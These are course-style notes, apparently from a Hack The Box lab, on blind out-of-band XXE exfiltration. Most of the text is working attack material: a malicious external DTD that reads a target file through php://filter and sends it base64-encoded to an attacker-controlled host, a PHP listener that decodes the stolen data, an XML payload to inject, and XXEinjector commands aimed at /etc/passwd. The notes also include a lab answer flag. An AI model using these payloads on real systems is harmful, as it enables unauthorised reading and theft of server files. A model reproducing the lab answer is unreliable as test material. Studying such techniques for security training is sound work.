## ID
532

## Module
Web Attacks

## Kind
notes

## Title
Section 16 — Blind Data Exfiltration (XXE)

## Description
Exfiltrating file contents through Out-of-Band (OOB) XXE when neither XML output nor error messages are reflected, by forcing the target to send base64-encoded file data to an attacker-controlled server.

## Tags
xxe, oob, blind, exfiltration, php-filter, xxeinjector

## Commands
- `echo '<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=<TARGET_FILE>"> <!ENTITY % oob "<!ENTITY content SYSTEM '"'"'http://<ATTACKER_IP>:<PORT>/?content=%file;'"'"'>">' > xxe.dtd`
- `php -S 0.0.0.0:8000`
- `git clone https://github.com/enjoiz/XXEinjector.git`
- `ruby XXEinjector.rb --host=<ATTACKER_IP> --httpport=8000 --file=<REQUEST_FILE> --path=<TARGET_FILE> --oob=http --phpfilter`

## What This Section Covers
In completely blind XXE scenarios — no reflected XML output, no error messages — data must be exfiltrated out-of-band. The technique forces the vulnerable server to read a file, base64-encode it via a PHP filter, and send the encoded content as a URL parameter in an HTTP request back to the attacker's server. This is the same OOB principle used in blind SQLi, blind XSS, and blind command injection.

## Methodology
1. Create an external DTD (`xxe.dtd`) that defines `%file` using `php://filter/convert.base64-encode/resource=<TARGET_FILE>` and `%oob` as an entity that makes an HTTP request to your server with `%file;` as a query parameter.
2. Create a PHP listener script (`index.php`) that receives the `content` GET parameter and base64-decodes it to the error log.
3. Start a PHP development server: `php -S 0.0.0.0:8000` (serves both the DTD and the listener).
4. Intercept the XML POST request in Burp Suite from the `/blind/` endpoint.
5. Replace the XML body with a DOCTYPE that loads your remote DTD via `%remote;`, calls `%oob;`, and references `&content;` in the body.
6. Send the request — the response will be generic (no leaked data visible).
7. Check your PHP server terminal — the decoded file content appears in the error log output.

## Multi-step Workflow (optional)
```
# 1. Create the external DTD
cat > xxe.dtd << EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/TARGET_FILE">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
EOF

# 2. Create the PHP auto-decode listener
cat > index.php << 'EOF'
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
EOF

# 3. Start PHP server (serves both xxe.dtd and index.php)
php -S 0.0.0.0:8000

# 4. XML payload for Burp Repeater
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>

# === Alternative: Automated with XXEinjector ===

# 5. Save the intercepted HTTP request (first XML line + XXEINJECT marker)
# POST /blind/submitDetails.php HTTP/1.1
# ...headers...
# <?xml version="1.0" encoding="UTF-8"?>
# XXEINJECT

# 6. Run XXEinjector
ruby XXEinjector.rb --host=ATTACKER_IP --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

# 7. Check results
cat Logs/TARGET_IP/etc/passwd.log
```

## Lab — Questions & Answers (optional)
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Read /327a6c4304ad5938eaf0efb6cc3e53dc.php via /blind | HTB{b1l1nd_d4t4_3xf1l7r4t10n} | OOB exfiltration — target fetched external DTD, base64-encoded the file, and sent it as a query param to attacker PHP server |

## Key Takeaways
- OOB XXE is the go-to when the app reflects nothing — no output, no errors. The data travels back to you via an HTTP callback, not through the response.
- Use `php -S` instead of `python3 -m http.server` because it executes the PHP listener script for decoding AND serves the DTD file — one server, two jobs.
- The base64 encoding via `php://filter` is essential because raw file content in a URL would break on special characters and length limits.
- DNS-based OOB exfiltration (encoding data as a subdomain) is an alternative when HTTP outbound is blocked but DNS is allowed.
- XXEinjector automates the entire flow — just provide the raw HTTP request with `XXEINJECT` as the payload marker and specify the target file path.
- All three XXE exfiltration methods (CDATA, error-based, OOB) require the target to make outbound connections to your server — if egress is firewalled, none of them work.

## Gotchas (optional)
- Don't use `python3 -m http.server` for this attack — it won't execute your PHP listener, so you'll see the request in the log but won't get auto-decoding.
- The XML payload body must include `<root>&content;</root>` (or reference `&content;` somewhere) — without it, the entity is never resolved and the OOB request is never triggered.
- XXEinjector stores results in `Logs/` by target IP — if the decoded output doesn't print to terminal, check the log files.
